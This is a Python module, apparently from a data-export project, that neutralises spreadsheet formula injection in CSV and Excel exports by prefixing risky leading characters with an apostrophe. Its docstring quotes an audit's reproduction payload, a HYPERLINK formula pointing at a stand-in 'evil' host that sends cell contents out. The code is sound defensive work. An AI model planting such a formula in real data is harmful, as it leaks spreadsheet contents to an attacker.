# SPDX-License-Identifier: BUSL-1.1
# Copyright (c) 2024-2026 Ali Sadeghi Aghili
"""Defuse spreadsheet formula injection in exported result cells.

Finding 15. Both export paths — ``exporters/excel_exporter.py``'s
``df.to_excel(...)`` and ``webapp/agent.py``'s ``csv.DictWriter`` — write
warehouse values straight into a file that is opened, by design, in Excel
or LibreOffice (the CSV is even written with a UTF-8 BOM specifically so
Excel picks the right encoding). Both of those programs treat a cell
whose *first* character is ``=``, ``+``, ``-`` or ``@`` as a formula to
evaluate on open, not text to display — a behaviour with nothing to do
with this project, this database, or CSV's own quoting rules (which
escape embedded quotes, and do nothing at all about a leading ``=``).

The attacker needs no access to this system. One text field anywhere
upstream — a company name, a free-text note typed into some other
application years ago — that ends up in a table this engine can query is
enough: the query pipeline faithfully extracts it and this project
packages it into the one file format that executes it. Reproduced live
during the audit with a warehouse ``Name`` of
``=HYPERLINK("//evil/"&A1)``: the exported cell survived CSV's own quoting
intact and Excel parsed it as a formula on open.

The standard neutralisation, applied here, is a single leading apostrophe:
every spreadsheet application treats a cell that starts with one as
literal text and does not render the apostrophe itself. It belongs at
this export boundary and nowhere upstream, because the underlying value
is not wrong — a real company name can legitimately start with ``=`` or
``-`` — it is only dangerous in the one file format that reads it as
code.

Why every export path must call the SAME function (rather than each
writer growing its own copy of this rule): the reasoning that moved
``interpret_rows`` into ``llm/interpret.py`` out of ``api/runner.py``
applies here identically — two copies of a security rule is one copy that
gets fixed after the next audit and one that quietly does not.
"""

from __future__ import annotations

#: Every character Excel, LibreOffice and Google Sheets treat as starting
#: a formula when it is the first character of a cell. Tab and carriage
#: return are included because a spreadsheet parser strips leading
#: whitespace before looking at the first significant character, so a
#: cell that merely *looks* blank at the front can still open as a
#: formula.
_DANGEROUS_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")


def defuse_formula(value: object) -> object:
    """Prefix *value* with ``'`` when it would otherwise open as a
    spreadsheet formula; return every other value unchanged.

    Non-string values (``None``, ``int``, ``float``, ...) pass straight
    through, untouched. This is deliberate, not an oversight: a numeric
    column exists to be summed, sorted and pivoted by whoever opens the
    export, and turning ``12000`` into the string ``"12000"`` (or, worse,
    ``"'12000"``) would break every one of those downstream uses for a
    threat that numbers cannot carry in the first place — a spreadsheet
    parses formula syntax out of cell *text*, never out of a numeric
    cell's own binary value. Only ``str`` can carry the payload, so only
    ``str`` is inspected.

    An ordinary string that happens to contain a hyphen but does not
    *start* with one — ``"a-b-c"``, an order code, a compound Persian
    surname — is returned unchanged: ``str.startswith`` looks only at the
    first character, exactly matching what a spreadsheet's own parser
    looks at before it decides a cell is a formula.
    """
    if not isinstance(value, str):
        return value
    if value.startswith(_DANGEROUS_PREFIXES):
        return "'" + value
    return value
